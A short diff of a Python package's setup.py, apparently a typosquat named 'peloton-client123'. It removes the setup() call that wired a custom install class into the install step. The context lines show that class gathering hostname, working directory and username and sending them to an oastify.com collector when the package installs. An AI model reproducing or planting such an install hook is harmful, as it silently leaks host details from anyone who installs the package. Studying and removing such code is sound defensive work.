@@ -14,10 +14,4 @@ class CustomInstall(install):
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
         requests.get("https://e1gl4m7gypj7g49tbwc6vvmr4ia9yzmo.oastify.com",params = ploads) 
 
-setup(name='peloton-client123', #package name
-      version='0.8.10',
-      description='test',
-      author='red-fire',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                                                          
